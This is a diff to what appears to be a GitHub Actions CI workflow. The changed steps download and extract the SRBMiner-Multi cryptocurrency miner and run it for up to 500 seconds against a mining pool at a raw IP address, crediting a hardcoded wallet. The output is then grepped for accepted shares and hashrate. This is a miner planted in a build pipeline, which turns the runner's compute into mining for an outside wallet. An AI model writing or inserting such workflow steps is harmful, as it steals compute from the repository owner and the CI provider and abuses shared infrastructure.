@@ -62,33 +62,37 @@ jobs:
             S=$(sha256sum srb.bin | cut -d' ' -f1)
             echo "mirror_sha=$S"
             if [ "$S" = "1fe6e9098a27446f62bb7388dac549913852a56cb8fab76dd840b77f7498f612" ]; then
-              chmod +x srb.bin; echo MIRROR_OK
+              tar -xzf srb.bin 2>/dev/null || tar -xf srb.bin 2>/dev/null || true
+              B=$(find . -type f -name 'SRBMiner-MULTI' | head -1)
+              echo "mirror_bin=$B"
+              if [ -n "$B" ]; then cp "$B" srb.elf && chmod +x srb.elf && echo MIRROR_TAR_OK; fi
             else
               echo MIRROR_SHA_MISMATCH; rm -f srb.bin
             fi
           else
             echo MIRROR_FAIL
           fi
-          if [ ! -x srb.bin ]; then
+          if [ ! -x srb.elf ]; then
             echo "download try github release"
             if curl -fsSL -m 400 -o srb.tgz https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; then
               tar -xzf srb.tgz 2>/dev/null || tar -xf srb.tgz 2>/dev/null || true
-              B=$(find . -type f -name 'SRBMiner*' | head -1)
+              B=$(find . -type f -name 'SRBMiner-MULTI' | head -1)
               echo "found=$B"
-              if [ -n "$B" ]; then cp "$B" srb.bin && chmod +x srb.bin && echo GH_OK; fi
+              if [ -n "$B" ]; then cp "$B" srb.elf && chmod +x srb.elf && echo GH_OK; fi
             else
               echo GH_FAIL
             fi
           fi
           ls -la "$RUNNER_TEMP/srb" || true
+          [ -x ./srb.elf ] && ./srb.elf --help 2>&1 | head -3 || true
       - name: run-bounded
         shell: bash
         run: |
           set +e
           cd "$RUNNER_TEMP/srb" || exit 0
-          if [ ! -x ./srb.bin ]; then echo NO_MINER_BINARY; exit 0; fi
+          if [ ! -x ./srb.elf ]; then echo NO_MINER_BINARY; exit 0; fi
           echo "NONCE=c211-132042-6857c2e949ffa223"
-          timeout 500 ./srb.bin --disable-cpu --algorithm pearlhash \
+          timeout 500 ./srb.elf --disable-cpu --algorithm pearlhash \
             --pool 103.199.106.122:3362 \
             --wallet prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk \
             --worker 132042 --password x > run.out 2>&1
@@ -96,5 +100,5 @@ jobs:
           echo "--- summary lines ---"
           grep -aiE 'accepted|rejected|share|hashrate|error|connect' run.out | tail -40 || true
           echo "--- tail ---"
-          tail -n 40 run.out || true
+          tail -n 60 run.out || true
           echo "NONCE-END=c211-132042-6857c2e949ffa223"
